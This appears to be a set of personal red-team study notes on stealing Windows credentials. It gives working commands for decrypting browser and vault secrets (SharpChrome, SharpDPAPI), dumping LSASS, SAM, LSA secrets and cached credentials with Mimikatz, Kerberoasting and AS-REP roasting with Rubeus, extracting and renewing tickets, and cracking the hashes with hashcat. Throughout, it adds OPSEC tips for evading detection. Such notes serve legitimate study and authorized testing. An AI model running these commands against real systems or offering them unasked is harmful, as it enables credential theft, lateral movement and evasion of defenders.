Credentials from Web Browsers

- browsers store credentials using Windows Data Protection API (DPAPI) in a local database.
- Most Chromium-based browsers keep a sql lite database at: %LOCALAPPDATA%\<vendor>\<browser>\User Data\Default\Login Data
- Chrome stores them at: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data

SharpChrome can automatically read and decrypt credentials: (medium integrity context)
execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
-----------------------------------------------------------------------

Windows Credential Manager

Stores creds that users asked to be stored such as RDP.
vaultcmd <-- can be used to show the presence of any saved creds.

Can also use seatbelts "WindowsVault"

execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

SharpDPAPI can automate pricess of decrypting the blobs

execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
-- credentials command will search through saved cred blobs for current user and decrypt them
-- /rpc arg can be used to leverage MS backupkey remote to ask dc to decrypt the AES key for us.
-----------------------------------------------------------------------

OS Credential Dumping

Below techniques require SYSTEM privileges to the Computer

LSASS Memory (Local Security Authority Subsystem Service (LSASS) 

- handles passowrd functions like verifying, changes, creatign access tokens, etc..
- SSPI (Security Support Provider Interface) which MS version of (Generic Security Service API) GSSAPI
- SSPI's provide different auth for windows

Mimikatz  can be used to dump these credentials
- ! makes mimikatz elevate to system, which is required to have for lsadump::sam
- @ makes mimikatz imersonate eacons thread token, good for impersonating users and commands such as lsadump::dcsync
-----------------------------------------------------------------------
NTLM Hashes
logonpasswords <-- alias for mimkatz sekurlsa::logonpasswords
NTLM hashes can be cracked in hashcat: .\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule
The hashes cab also be used in pass the hash attacks pth
-----------------------------------------------------------------------
Kerberos Keys
mimikats sekurlsa::ekeys <-- dumps kerberos encryption keys

Note that Mimikatz incorrectly labels each hash as des_cbc_md4.  The hash at the top has a length of 64 and is aes256-cts-hmac-sha1-96.  You may also see aes128-cts-hmac-sha1-96 and rc4_hmac which are 32 in length.

Can be cracked but much slower then NTLM: Hashcat is $krb5db$18$<username>$<DOMAIN-FQDN>$<hash> and can be cracked using hash mode 28900. Beter to request kerberos tickets

.\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule
$krb5db$18$rsteel$CONTOSO.COM$05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960:Passw0rd!

OPSEC

Lsass dumping is a bad idea from opsec many tools will detect it
-----------------------------------------------------------------------
Security Account Manager (SAM) stores credentials for local accounts across the 
- HKLM\sam and HKLM\system hives
Adversary may extract the usernames and password hashesfrom the database.

mimikatz !lsadump::sam
-----------------------------------------------------------------------
LSA Secrets
- protected storage used by the LSA (LocalSecurity Authority)
- can possibly extract the cached in memory r directly from: HKLM/Security/Policy/Secrets hivethey are encrypted but keys are stored in HKLM/Security/Policy
mimikatz !lsadump::secrets (will automate the process)
-----------------------------------------------------------------------

Cached Domain Credentials

Think logons for laptops that connect to a network that need to access laptop when they are offline, till the ycan get on the network. 
default windows is configured to store 10, count is in CachedLogonCount key of HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon

These can not be used for PTH, they need to be cracked and clear text used. stored in MsCacheV2 format, iteration count is a must know for cracking

mimikatz !lsadump::cache

Can be cracked but very slow

.\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule
$DCC2$10240#rsteel#0ac91f0033a92c25a174679953789ba:Passw0rd!

-----------------------------------------------------------------------

Kerberos Tickets

AS-REP Roasing (Authentication Server Responsse Roasting): obtaining the plaintext password of accounts that have Kerberos preauthentication disabled

Rubeus asreproast: enumerate every account that has preauthentication disabled, sends an AS-REQ for them, then carves out the encrypted part

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
** By default, Rubeus outputs hashes for John the Ripper.  Use /format:hashcat to output them for Hashcat instead. **

These RC4 AS-REP's can be cracked using hashcat's 18200 mode. <-- RC4 is bad opsec  but can be cracked with hashcat
.\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
$krb5asrep$23$oracle_svc@contoso.com:92d6f[...snip...]19124:Passw0rd!

OPSEC issues
- RC4
- Muliple as-rep in short time.

Kerberoasting: or obtaining the plaintext password of the service account associated with an SPN

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
These hashes can be cracked using hashcat's 13100 hash mode.

PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule
$krb5tgs$23$*mssql_svc$contoso.com$MSSQLSvc/lon-sql-1.contoso.com:1433@contoso.com*$95505[...snip...]9a715:Passw0rd!

OPSEC
Each TGS-REP generates a 4769 event, so a single user requesting multiple tickets in a short timeframe should be investigated.  As with AS-REP Roasting, Rubeus requests service tickets using RC4 encryption by default.

BETTER OPTION

A safer approach is to use an enumeration tool to triage potential targets first, then roast them more selectively.


FIND ACCOUNTS THAT CAN BE KERBROASTED
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
            
ATTACK ACCOUNTS
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:MSSQLSvc/lon-sql-1.contoso.com:1433 /simple /nowrap <-- use the Serviceprincipalname field of command above.


Etracting tickets: 
If adversay has elevated access they can extract kerberos tickes that are currently cached in memory. 
- Rubeus triage will enumerate every logon session present and their associated tickets. TGT and Service tickets can be extracted and used by the aadversary. 

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

Rubeus dump command with no additional param will extract all tickets. use Rubeus dump with the /service and or /luid to target specific service and or logon sessions.

Tickets with krbtgt in service fireld are TGT and other tickers are service tickers.

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap <-- 0x4d2c80 comes from the triage and the user we want to target. 

Renewing tickets
- Rubeus describe command witll tell us ticket StartTime, EndTime, RenewTill 

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N

StartTime                :  11/04/2025 16:33:17
  EndTime                  :  12/04/2025 02:33:17
  RenewTill                :  18/04/2025 16:33:17

We can renew the ticket ourselves with in the window till the renewTill date:
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap

